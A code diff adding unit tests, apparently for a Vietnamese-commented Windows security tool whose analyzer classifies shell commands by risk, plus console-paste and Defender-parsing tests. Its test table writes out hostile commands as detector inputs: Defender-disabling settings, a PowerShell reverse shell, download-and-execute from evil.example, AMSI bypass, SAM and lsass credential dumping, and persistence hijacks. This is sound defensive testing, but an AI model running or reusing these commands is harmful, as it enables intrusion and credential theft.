@@ -9,8 +9,13 @@
 #include <cstdio>
 #include <initializer_list>
 
+#define WIN32_LEAN_AND_MEAN
+#include <windows.h>
+#include <shellapi.h> // CommandLineToArgvW
+
 #include "tools/security/engine/CommandAnalyzer.h"
 #include "tools/security/engine/CommandLauncher.h"
+#include "tools/security/engine/ConsolePaste.h"
 #include "tools/security/engine/DefenderController.h"
 #include "tools/security/engine/DefenderScanWorker.h"
 #include "tools/security/engine/HostsBlocklist.h"
@@ -192,6 +197,147 @@ int main(int argc, char** argv)
             CHECK(analyze(cmd).isSafe());
     }
 
+    // ---- CommandAnalyzer v1.28.1: các ca phân loại sai do rà soát độc lập tìm ra (mỗi ca đã chạy THẬT qua bản cũ
+    // để xác nhận sai), cùng các ca phải giữ nguyên. Chuỗi mẫu ghép từ mảnh rời - xem ghi chú hàm S(). ----
+    {
+        using CommandAnalyzer::analyze;
+        using RL = CommandAnalyzer::RiskLevel;
+        const QString enDash(QChar(0x2013)), emDash(QChar(0x2014));
+        const QString setMp = S({"Set-MpPre", "ference "});
+        const QString addMp = S({"Add-MpPre", "ference "});
+        const QString rt = S({"Disable", "Realtime", "Monitoring"});
+        const QString wd = S({"WinDe", "fend"});
+        const QString url = "https://evil.example/a";
+        const QString b64calc = "YwBhAGwAYwA=";
+        struct Case
+        {
+            QString command;
+            RL expected;
+        };
+        const QList<Case> cases = {
+            // -- Bỏ sót (trước đây thấp hơn mức thật) --
+            // dấu gạch Unicode trước tham số
+            {setMp + enDash + rt + " $true", RL::Dangerous},
+            {setMp + emDash + rt + ":$true", RL::Dangerous},
+            {addMp + enDash + S({"Exclusion", "Path C:\\"}), RL::Suspicious},
+            {S({"Set-NetFire", "wallProfile -All "}) + enDash + S({"Enabled Fal", "se"}), RL::Dangerous},
+            // bí danh chính thức + tiền tố ngắn không nhập nhằng
+            {setMp + "-drtm $true", RL::Dangerous},
+            {setMp + "-dbm 1", RL::Dangerous},
+            {setMp + "-dioavp $true", RL::Dangerous},
+            {setMp + "-dtp $true", RL::Dangerous},
+            {setMp + S({"-Disa", "bleIO $true"}), RL::Dangerous},
+            {setMp + S({"-Disa", "bleBe $true"}), RL::Dangerous},
+            {setMp + S({"-Disa", "bleBl $true"}), RL::Dangerous},
+            {setMp + S({"-Disa", "bleAr $true"}), RL::Dangerous},
+            {setMp + S({"-Disa", "bleE $true"}), RL::Dangerous},
+            {setMp + S({"-Disable", "Tamper", "Protection $true"}), RL::Dangerous},
+            {setMp + S({"-Disable", "DnsParsing $true"}), RL::Suspicious},     // lớp kiểm tra phụ
+            {setMp + "-ddnsp 1", RL::Suspicious},
+            // splatting / khóa registry chính sách
+            {S({"$p=@{", "Disable", "Realtime", "Monitoring=$true}; "}) + setMp + "@p", RL::Dangerous},
+            {S({"reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defe", "nder\\Real-Time Protection\" /v "}) + rt +
+                 " /t REG_DWORD /d 1 /f",
+             RL::Dangerous},
+            {S({"New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defe", "nder' -Name Disable",
+                "AntiSpyware -Value 1 -PropertyType DWord"}),
+             RL::Dangerous},
+            {setMp + S({"-HighThreat", "DefaultAction 6 -SevereThreat", "DefaultAction 6 -Force"}), RL::Dangerous},
+            // dịch vụ bảo vệ
+            {S({"Set-Ser", "vice -Name "}) + wd + " -StartupType Disabled", RL::Dangerous},
+            {S({"sc con", "fig "}) + wd + " start= disabled", RL::Dangerous},
+            {S({"Get-Service "}) + wd + S({" | Stop-Ser", "vice -Force"}), RL::Dangerous},
+            // reverse shell
+            {S({"$c = New-Object Net.Soc", "kets.TCPClient('10.0.0.1',4444); $s = $c.Get", "Stream()"}), RL::Dangerous},
+            {S({"[System.Net.Soc", "kets.TcpClient]::new('10.0.0.1',4444).Get", "Stream()"}), RL::Dangerous},
+            // tải về rồi chạy
+            {"iwr " + url + S({".exe -OutFile $env:TEMP\\a.exe; & $env:TEMP\\a", ".exe"}), RL::Dangerous},
+            {"iwr " + url + S({".exe -OutFile a.exe; sta", "rt a.exe"}), RL::Dangerous},
+            {"curl.exe -s " + url + S({".ps1 -o $env:TEMP\\a.ps1; power", "shell -File $env:TEMP\\a.ps1"}), RL::Dangerous},
+            {"iwr " + url + S({".exe -OutFile a.exe\n.\\a", ".exe"}), RL::Dangerous},
+            {S({"& ([script", "block]::Cre", "ate((irm "}) + url + ".ps1)))", RL::Dangerous},
+            {S({"$ExecutionContext.InvokeCommand.Invoke", "Script((irm "}) + url + ".ps1))", RL::Dangerous},
+            // che giấu: nháy cong, ^ nối dòng của cmd.exe
+            {QString::fromUtf8("&(‘I’+‘E") + "X’) $x", RL::Dangerous},
+            {QString::fromUtf8("i‘’e") + "x $x", RL::Dangerous},
+            {QString::fromUtf8("(New-Object Net.WebClient).(“Down”+“load") + QString::fromUtf8("String”).Invoke(‘http://x/a.ps1’)"),
+             RL::Dangerous},
+            {S({"power", "shell -nop ^\n  -e "}) + b64calc, RL::Dangerous},
+            {S({"power", "shell -nop ^\r\n-enc "}) + b64calc, RL::Dangerous},
+            // duy trì / chiếm quyền chạy
+            {S({"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Once /v x /d C:\\a.exe /f"}), RL::Suspicious},
+            {S({"reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Exe", "cution Options\\se",
+                "thc.exe\" /v Debug", "ger /t REG_SZ /d C:\\Windows\\System32\\cmd.exe /f"}),
+             RL::Dangerous},
+            {S({"Set-WmiInstance -Namespace root\\subscription -Class CommandLine", "EventConsumer -Arguments @{Name='x'}"}),
+             RL::Dangerous},
+            // đánh cắp thông tin đăng nhập
+            {S({"reg sa", "ve HKLM\\S", "AM C:\\temp\\sam.save"}), RL::Dangerous},
+            {S({"proc", "dump.exe -accepteula -ma ls", "ass.exe C:\\temp\\l.dmp"}), RL::Dangerous},
+            {S({"$a=[K]::GetProcAddress([K]::LoadLibrary('amsi.dll'),'Amsi", "ScanBuffer')"}), RL::Dangerous},
+            // LOLBin
+            {S({"wm", "ic os get /for", "mat:\""}) + url + ".xsl\"", RL::Dangerous},
+            {S({"ms", "iexec /q /i "}) + url + ".msi", RL::Suspicious},
+            // hạ cấp PowerShell / tắt UAC
+            {S({"power", "shell -ver", "sion 2 -nop -c Get-Date"}), RL::Suspicious},
+            {S({"reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v Enable", "LUA /t REG_DWORD /d 0 /f"}),
+             RL::Dangerous},
+
+            // -- Báo nhầm (trước đây cao hơn mức thật) --
+            {"(New-Object Net.WebClient).DownloadFile('https://example.com/tool.zip','C:\\temp\\tool.zip')", RL::Suspicious},
+            {"Start-BitsTransfer -Source https://download.example.com/app.msi -Destination C:\\temp\\app.msi", RL::Suspicious},
+            {S({"Remove-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defe", "nder' -Name Disable", "AntiSpyware"}),
+             RL::Suspicious},
+            {S({"reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defe", "nder\" /v Disable", "AntiSpyware /t REG_DWORD /d 0 /f"}),
+             RL::Suspicious},
+            {"Stop-Process -Name mshta -Force", RL::Safe},
+            {"taskkill /im mshta.exe /f", RL::Safe},
+            {"rundll32 printui.dll,PrintUIEntry /in /n \"\\\\printsrv\\HP-Floor2\"", RL::Safe},
+            {"Register-WmiEvent -Query \"SELECT * FROM Win32_ProcessStartTrace\" -SourceIdentifier ProcStart", RL::Suspicious},
+            {"sc.exe config " + wd + " start= auto", RL::Safe},
+            {"Copy-Item D:\\DownloadFiles\\report.xlsx E:\\Backup", RL::Safe},
+            {"powershell -c \"ping -n 4 -w 1 192.168.1.1\"", RL::Safe},
+            {"pwsh -c \"Get-Content .\\data.csv -Enc BigEndianUnicode\"", RL::Safe},
+            {"pwsh -File .\\deploy.ps1 -e Production", RL::Safe},
+            {"git grep -e 0123456789abcdef0123456789abcdef01234567", RL::Safe},
+            {"Stop-Service Spooler; Get-Service " + wd, RL::Safe},
+            {"(New-Object Net.Sockets.TcpClient).Connect('example.com', 443)", RL::Suspicious}, // kiểm tra cổng
+            {setMp + S({"-Disable", "AutoExclusions $true"}), RL::Safe}, // tắt tự loại trừ = TĂNG bảo vệ
+            {setMp + S({"-Disable", "CatchupQuickScan $true"}), RL::Safe},
+
+            // -- Phải giữ nguyên --
+            {"irm https://get.example.dev | i" + QString("ex"), RL::Dangerous},
+            {S({"Set-ExecutionPolicy Bypass -Scope Process -Force; i", "ex ((New-Object System.Net.WebClient).Down",
+                "loadString('https://community.chocolatey.org/install.ps1'))"}),
+             RL::Dangerous},
+            {S({"[Ref].Assembly.GetType('System.Management.Automation.'+'Am'+'si", "Utils')"}), RL::Dangerous},
+            {S({"cmd /c \"p^ower^shell -n^op -w hidden -e^nc "}) + b64calc + "\"", RL::Dangerous},
+            {setMp + "-" + rt + " (1 -eq 1)", RL::Dangerous},
+            {setMp + "-" + rt + S({" $false -Disable", "BehaviorMonitoring $false"}), RL::Safe},
+            {"[System.Reflection.Assembly]::LoadWithPartialName('System.Drawing')", RL::Safe},
+            {"Select-String -Path a.txt -Pattern x -Encoding UTF8", RL::Safe},
+            {"(Get-FileHash a.exe).Hash -eq '" + QString(64, 'a') + "'", RL::Safe},
+            {"Get-ChildItem -Exclude *.tmp", RL::Safe},
+            {"New-NetFirewallRule -DisplayName x -Direction Inbound -Action Allow", RL::Safe},
+            {"powershell -NoProfile -File .\\build.ps1", RL::Safe},
+            {"Invoke-WebRequest https://example.com/a.json | ConvertFrom-Json", RL::Suspicious},
+        };
+        int idx = 0;
+        for (const Case& c : cases)
+        {
+            const auto v = analyze(c.command);
+            if (v.level != c.expected)
+                std::printf("  ca %d: mong %s, ra %s\n", idx, qPrintable(CommandAnalyzer::riskLevelLabel(c.expected)),
+                            qPrintable(CommandAnalyzer::riskLevelLabel(v.level)));
+            CHECK(v.level == c.expected);
+            ++idx;
+        }
+
+        // Bộ chuẩn hóa: nháy cong về nháy thẳng; ^ cuối dòng nối dòng (giữ khoảng trắng dòng sau)
+        CHECK(CommandAnalyzer::internal::normalizeForMatching(QString::fromUtf8("‘a’+‘b’ “c”")) == "'ab' \"c\"");
+        CHECK(CommandAnalyzer::internal::normalizeForMatching("a ^\r\n  b^c") == "a   bc");
+    }
+
     CHECK(CommandAnalyzer::riskLevelLabel(CommandAnalyzer::RiskLevel::Safe) == "An toàn");
     CHECK(CommandAnalyzer::riskLevelLabel(CommandAnalyzer::RiskLevel::Dangerous) == "Nguy hiểm");
 
@@ -326,6 +472,32 @@ int main(int argc, char** argv)
         QString err4;
         CHECK(DefenderController::internal::parseThreatsJson("{khong phai json", &err4).isEmpty());
         CHECK(!err4.isEmpty());
+
+        // Resources = $null trên PS 5.1 ra [""] (đo thật) -> không có đường dẫn nào, để giao diện hiện "—"
+        const auto noPath = DefenderController::internal::parseThreatsJson(
+            R"({"ThreatID":1,"ThreatName":"X","SeverityID":5,"Resources":["", "  "],"IsActive":true})", nullptr);
+        CHECK(noPath.size() == 1 && noPath.first().resources.isEmpty());
+        const auto somePath = DefenderController::internal::parseThreatsJson(
+            R"({"ThreatID":1,"ThreatName":"X","SeverityID":5,"Resources":["","file:_C:\\a.exe"],"IsActive":true})", nullptr);
+        CHECK(somePath.size() == 1 && somePath.first().resources == QStringList({"file:_C:\\a.exe"}));
+        // ThreatID vượt quá int32 (ID thật của Defender, vd 2147519003 = EICAR) không bị cắt
+        const auto bigId = DefenderController::internal::parseThreatsJson(
+            R"([{"ThreatID":2147519003,"ThreatName":"Y","SeverityID":1,"Resources":[],"IsActive":false}])", nullptr);
+        CHECK(bigId.size() == 1 && bigId.first().threatId == 2147519003LL);
+    }
+
+    // ---- DefenderController::toggleOutcome: kết luận sau khi bật/tắt (hồi quy "✓ Đã tắt" giả khi đọc lại lỗi) ----
+    {
+        using DefenderController::ToggleOutcome;
+        using DefenderController::toggleOutcome;
+        CHECK(toggleOutcome("", true, true) == ToggleOutcome::Applied);
+        CHECK(toggleOutcome("", false, false) == ToggleOutcome::Applied);
+        CHECK(toggleOutcome("", true, false) == ToggleOutcome::NotApplied);
+        CHECK(toggleOutcome("", false, true) == ToggleOutcome::NotApplied);
+        // Đọc lại lỗi: trạng thái mặc định (false) TRÙNG với yêu cầu "tắt" - trước đây báo "✓ Đã tắt"
+        CHECK(toggleOutcome("Hết thời gian chờ", false, false) == ToggleOutcome::Unknown);
+        CHECK(toggleOutcome("Hết thời gian chờ", false, true) == ToggleOutcome::Unknown);
+        CHECK(toggleOutcome("x", true, true) == ToggleOutcome::Unknown);
     }
 
     // ---- HostsBlocklist: phân tích/dựng lại nội dung hosts file - THUẦN CHUỖI, không đụng tệp thật ----
@@ -542,12 +714,124 @@ int main(int argc, char** argv)
         CHECK(lineCount("a") == 1);
         CHECK(lineCount(prepareForPaste("a\nb\n\nc\n")) == 4);
 
+        CHECK(prepareForPaste("") == "");
+        CHECK(prepareForPaste("Get-Date") == "Get-Date");
+        CHECK(prepareForPaste("\tGet-Date") == "\tGet-Date");            // thụt lề dòng đầu được giữ
+        CHECK(prepareForPaste("a\n\n\nb") == "a\n\n\nb");                // dòng trắng GIỮA lệnh được giữ
+        CHECK(prepareForPaste("a\r\n\r\n") == "a");
+        CHECK(prepareForPaste(QString("a") + QChar(0x2028) + "b\r\n") == "a\nb");
+        CHECK(prepareForPaste("a  \t\r\n  ") == "a");                    // khoảng trắng/tab cuối bị bỏ
+        CHECK(prepareForPaste(QString("a") + QChar(0x00A0)) == "a");      // NBSP cuối cũng là khoảng trắng
+        CHECK(lineCount("a\nb") == 2);
+
+        // Từ v1.28.1 lệnh nhiều dòng KHÔNG còn bị hỏi lại (dán qua PSReadLine không chạy dòng nào - đo thật);
+        // chỉ còn cảnh báo khi ứng dụng đang có quyền Administrator.
         CHECK(pasteWarnings("Get-Process", false).isEmpty());
         CHECK(pasteWarnings("Get-Process", true).size() == 1);
         CHECK(pasteWarnings("Get-Process", true).first().contains("Administrator"));
-        CHECK(pasteWarnings("a\nb", false).size() == 1);
-        CHECK(pasteWarnings("a\nb", false).first().contains("2 dòng"));
-        CHECK(pasteWarnings("a\nb", true).size() == 2);
+        CHECK(pasteWarnings("a\nb", false).isEmpty());
+        CHECK(pasteWarnings("a\nb\nc", true).size() == 1);
+
+        // Hướng dẫn tự dán: luôn có Ctrl+V; lệnh nhiều dòng thì cảnh báo thêm về dán bằng chuột phải.
+        CHECK(manualPasteHint(1).contains("Ctrl+V"));
+        CHECK(!manualPasteHint(1).contains(QString::fromUtf8("chuột phải")));
+        CHECK(manualPasteHint(3).contains(QString::fromUtf8("chuột phải")));
+
+        // Diễn giải mã thoát của tiến trình phụ "--console-paste"
+        using O = ConsolePaste::Outcome;
+        auto res = [](O o, int lines = 1) { return helperResult(static_cast<int>(o), false, lines, 20); };
+        CHECK(res(O::Pasted).ok);
+        CHECK(res(O::Pasted).message.contains(QString::fromUtf8("CHƯA chạy")));
+        CHECK(!res(O::Pasted).message.contains("Tab"));
+        CHECK(helperResult(0, false, 1, 20, /*hasTabs=*/true).message.contains("Tab")); // Paste của PSReadLine đổi Tab
+        CHECK(res(O::SentUnverified).ok);
+        CHECK(!res(O::AttachFailed).ok);
+        CHECK(res(O::AttachFailed).message.contains("Ctrl+V"));
+        CHECK(!res(O::NotSeen).ok);
+        CHECK(res(O::NotSeen).message.contains("20 giây"));
+        CHECK(!res(O::PromptIdle).ok);
+        CHECK(res(O::PromptIdle).message.contains("PSReadLine"));
+        CHECK(res(O::PromptIdle, 2).message.contains(QString::fromUtf8("chuột phải")));
+        CHECK(!res(O::ProcessExited).ok);
+        CHECK(!res(O::BadArguments).ok);
+        CHECK(res(O::BadArguments).message.contains("6"));
+        CHECK(!res(O::WriteFailed).ok);
+        CHECK(!helperResult(99, false, 1, 20).ok);                       // mã lạ
+        CHECK(helperResult(99, false, 1, 20).message.contains("99"));
+        CHECK(!helperResult(-1, false, 1, 20).ok);
+        CHECK(!helperResult(0, true, 1, 20).ok);                         // tiến trình phụ bị kết thúc
+        CHECK(helperResult(0, true, 1, 20).message.contains(QString::fromUtf8("đóng")));
+        CHECK(!helperResult(static_cast<int>(0xC000013Au), false, 1, 20).ok); // STATUS_CONTROL_C_EXIT
+        for (int code = -2; code <= 10; ++code)                         // không mã nào ra thông báo rỗng
+            CHECK(!helperResult(code, false, 2, 20).message.trimmed().isEmpty());
+
+        // Dòng lệnh CreateProcessW: tách lại bằng đúng quy tắc của Windows (CommandLineToArgvW) phải ra y nguyên
+        const QString exe = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
+        CHECK(buildCommandLine(exe, {}) == "\"" + exe + "\"");
+        const QList<QStringList> argSets = {
+            {"-NoProfile"},
+            {"-NoProfile", "-NoExit", "-Command", "Remove-Module PSReadLine"},
+            {""},
+            {"a b", "c\"d", "e\\f", "g\\\"h", "trailing\\", "two words\\", "\\\\server\\share x"},
+            {"tab\there", "  ", "\"", "\\"},
+        };
+        for (const QStringList& args : argSets)
+        {
+            const QString line = buildCommandLine(exe, args);
+            int n = 0;
+            LPWSTR* parsed = CommandLineToArgvW(reinterpret_cast<LPCWSTR>(line.utf16()), &n);
+            QStringList back;
+            for (int i = 0; parsed && i < n; ++i)
+                back << QString::fromWCharArray(parsed[i]);
+            LocalFree(parsed);
+            CHECK(back.size() == args.size() + 1);
+            CHECK(!back.isEmpty() && back.first() == exe);
+            CHECK(back.mid(1) == args);
+        }
+    }
+
+    // ---- ConsolePaste::internal: nhận ra lệnh trên màn hình console (không mở console nào) ----
+    {
+        using namespace ConsolePaste::internal;
+        CHECK(asciiLettersAndDigits("Get-Process -Id 42 | Stop-Process") == "GetProcessId42StopProcess");
+        // Chữ có dấu bị bỏ: PSReadLine 2.0 có thể VẼ chúng thành "?" (nội dung bên trong vẫn đúng) - lệnh gốc và
+        // màn hình phải ra cùng một chuỗi dù chữ có dấu hiện đúng hay hiện thành "?".
+        CHECK(asciiLettersAndDigits(QString::fromUtf8("Tiếng Việt: đã dán!")) == "TingVitdn");
+        CHECK(asciiLettersAndDigits("Ti?ng Vi?t: ?? d?n!") == "TingVitdn");
+        CHECK(verificationKey(QString::fromUtf8("Write-Output 'Tiếng Việt có dấu'")) ==
+              verificationKey("Write-Output 'Ti?ng Vi?t c? d?u'"));
+        CHECK(asciiLettersAndDigits(QString::fromUtf8("漢字 😀 ０１２")).isEmpty()); // chữ số toàn khổ không phải ASCII
+        CHECK(asciiLettersAndDigits("$_ | % {$_}").isEmpty());
+        CHECK(asciiLettersAndDigits("").isEmpty());
+        CHECK(verificationKey(QString::fromUtf8("漢字\nGet-Date")).isEmpty()); // dòng đầu không có chữ/số ASCII
+
+        CHECK(verificationKey("Get-Date") == "GetDate");
+        CHECK(verificationKey("\n\n  \nGet-Date\nSet-Content") == "GetDate");   // dòng KHÔNG trống đầu tiên
+        CHECK(verificationKey(QString(100, 'a')) == QString(40, 'a'));          // tối đa 40 ký tự
+        CHECK(verificationKey("abc", 2) == "ab");
+        CHECK(verificationKey("abc", 0).isEmpty());
+        CHECK(verificationKey("$_ | % {$_}\nGet-Date").isEmpty());             // dòng đầu chỉ có ký hiệu
+        CHECK(verificationKey("").isEmpty());
+        CHECK(verificationKey("   \n\t").isEmpty());
+
+        // Lệnh tự gãy dòng trên console + dấu nhắc nối dòng ">> " của PSReadLine vẫn khớp
+        const QString screen = "PS C:\\Users\\HP> Set-Content -LiteralPath 'C:\\Te"
+                               "mp\\marker.txt' -Value ran                     "
+                               ">> Get-Date";
+        CHECK(countOccurrences(asciiLettersAndDigits(screen), verificationKey("Set-Content -LiteralPath 'C:\\Temp\\marker.txt' -Value ran")) == 1);
+        CHECK(countOccurrences("aaaa", "aa") == 2);                             // không chồng lấn
+        CHECK(countOccurrences("abcabc", "abc") == 2);
+        CHECK(countOccurrences("abc", "") == 0);
+        CHECK(countOccurrences("", "a") == 0);
+        CHECK(countOccurrences("ab", "abc") == 0);
+
+        CHECK(looksLikeIdlePrompt("PS C:\\>"));
+        CHECK(looksLikeIdlePrompt("PS C:\\Users\\HP> "));
+        CHECK(looksLikeIdlePrompt(">> "));
+        CHECK(!looksLikeIdlePrompt(""));
+        CHECK(!looksLikeIdlePrompt("   "));
+        CHECK(!looksLikeIdlePrompt("PS C:\\> Get-Da"));                          // đang có chữ sau dấu nhắc
+        CHECK(!looksLikeIdlePrompt("Loading personal and system profiles took 812ms."));
     }
 
     // ---- Hồi quy các lỗi tìm thấy khi stress test (xem tests/secdl_stress_tests.cpp) ----
@@ -661,6 +945,7 @@ int main(int argc, char** argv)
     std::printf("passed=%d failed=%d\n", g_pass, g_fail);
     std::printf("\nLUU Y: khong co Windows Defender/hosts file THAT trong test nay - cac ham goi\n");
     std::printf("PowerShell/doc-ghi he thong that (getStatus/startScan/listThreats/removeAllActiveThreats/\n");
-    std::printf("addDomain/removeDomain/CommandLauncher) can duoc tu kiem tra tay tren may that.\n");
+    std::printf("addDomain/removeDomain) can duoc tu kiem tra tay tren may that. Luong mo PowerShell + dan lenh\n");
+    std::printf("(CommandLauncher/ConsolePaste) duoc kiem dau-cuoi o command_launcher_tests.\n");
     return g_fail == 0 ? 0 : 1;
 }
